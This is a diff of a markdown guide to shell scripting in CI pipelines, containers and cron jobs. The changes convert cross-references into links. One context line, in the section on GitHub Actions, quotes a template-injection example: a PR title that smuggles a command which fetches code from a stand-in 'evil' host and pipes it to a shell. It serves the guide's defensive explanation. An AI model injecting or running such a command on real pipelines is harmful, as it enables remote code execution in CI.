@@ -1,7 +1,7 @@
 # 04 — CI & Operational Scripts
 
 Shell embedded in CI YAML, container entrypoints, Makefiles, and long-running jobs.
-Smaller file; pipeline-wide hardening lives in `sota-devsecops`.
+Smaller file; pipeline-wide hardening lives in [`sota-devsecops`](../../sota-devsecops/SKILL.md).
 
 ## 1. GitHub Actions (and CI generally) shell pitfalls
 
@@ -33,7 +33,7 @@ script *before* the shell parses it — a PR title of `"; curl evil | sh; "` exe
 Treat ALL `github.event.*`, branch names, commit messages, issue/PR text as attacker-
 controlled. Lint with `actionlint` (embeds ShellCheck for run blocks) and audit with
 `zizmor` (template injection, credential persistence, excessive permissions). Full
-taxonomy → `sota-devsecops`.
+taxonomy → [`sota-devsecops`](../../sota-devsecops/SKILL.md).
 
 **Multiline `run:` blocks**: each step is one script — a failing middle line only stops
 the step because of `-e`; verify the effective shell options for your CI (GitLab Runner's
@@ -95,7 +95,7 @@ check quietly stops mattering:
 git push
 ```
 
-This is the *interactive* twin of `set -e` (§1, rules/01 §2): in a script errexit would
+This is the *interactive* twin of `set -e` (§1, [rules/01](01-safety-baseline.md) §2): in a script errexit would
 stop you; typed at a prompt or joined with `;` in a CI `run:` block, nothing does. The
 tell is that you saw the failure scroll past and the next command ran anyway.
 
@@ -104,7 +104,7 @@ than merely ignored:
 
 - **A pipe rewrites the status.** `check.sh | tail -2` reports `tail`'s success, so even
   `&&` would not save you — read the producer's status (`${PIPESTATUS[0]}` in bash,
-  `${pipestatus[1]}` in zsh, rules/01 §3) or drop the pipe.
+  `${pipestatus[1]}` in zsh, [rules/01](01-safety-baseline.md) §3) or drop the pipe.
 - **Diff-based checks can legitimately differ before and after a push**, because their
   merge base changes. Re-run the gate *after* the branch exists upstream before
   concluding the tree is broken — and never let the first, pre-push result authorise the
@@ -138,7 +138,7 @@ string — injection; and signals stop at `su`). Prefer `USER app` in the Docker
 no root setup is needed at all.
 
 **Dialect**: alpine/distroless-adjacent base images have no bash — entrypoints there are
-`#!/bin/sh` + busybox-clean (rules/02 §5), or you install bash explicitly. CRLF line
+`#!/bin/sh` + busybox-clean ([rules/02](02-robustness-correctness.md) §5), or you install bash explicitly. CRLF line
 endings in an entrypoint produce `/usr/bin/env: 'bash\r': No such file` — enforce LF via
 `.gitattributes` (`*.sh text eol=lf`).
 
@@ -205,10 +205,10 @@ exec > >(stdbuf -oL tee -a "$logfile") 2>&1
 - Progress/heartbeat for anything > ~60s silent (CI runners kill "stalled" jobs;
   e.g. `printf 'still waiting for %s (%ds)\n' "$svc" "$elapsed"` every 15–30s in wait loops).
 - Log decisions and inputs (versions, target, flags) at start; final status + duration at
-  end; everything through the stderr/stdout discipline of rules/02 §3 so CI annotates
+  end; everything through the stderr/stdout discipline of [rules/02](02-robustness-correctness.md) §3 so CI annotates
   errors correctly.
 - Cron jobs: cron's environment is minimal (PATH=/usr/bin:/bin, no profile) — set PATH
-  in-script (rules/03 §3); redirect both streams to a log or you get silent failures /
+  in-script ([rules/03](03-security.md) §3); redirect both streams to a log or you get silent failures /
   mail spam: `*/5 * * * * /opt/job.sh >>/var/log/job.log 2>&1`.
 
 ## Killing a backgrounded build orphans its children
@@ -226,15 +226,15 @@ kill 92354                 # the runner shell — returns instantly, looks done
 
 Why it matters beyond tidiness: restart now and two builds contend for one `target/`, and
 **the second run's failure gets attributed to the change you are testing**. That is the same
-misattribution as `sota-code-security` rules/15 §2.1's sixth mode, arriving through the
+misattribution as [`sota-code-security` rules/15](../../sota-code-security/rules/15-instruments-and-guards.md) §2.1's sixth mode, arriving through the
 environment instead of the harness.
 
 Kill the **group**, having started it in its own: `setsid cmd &` then `kill -- -"$pgid"`.
-(`rules/05` §3 shows the inside-the-script half — `trap 'trap - TERM; kill -TERM -- -$$'`
+([`rules/05`](05-constructs-and-cleanup.md) §3 shows the inside-the-script half — `trap 'trap - TERM; kill -TERM -- -$$'`
 forwards a signal to your own group, and only works when the script leads that group;
 this is the same mechanism applied from outside.)
 Otherwise sweep by pattern — and **verify the sweep before restarting**, because `pkill -f`
-matches the sweeping shell's own argv (`rules/01` §3) and a survivor is invisible until it
+matches the sweeping shell's own argv ([`rules/01`](01-safety-baseline.md) §3) and a survivor is invisible until it
 corrupts the next run.
 
 ## Audit checklist
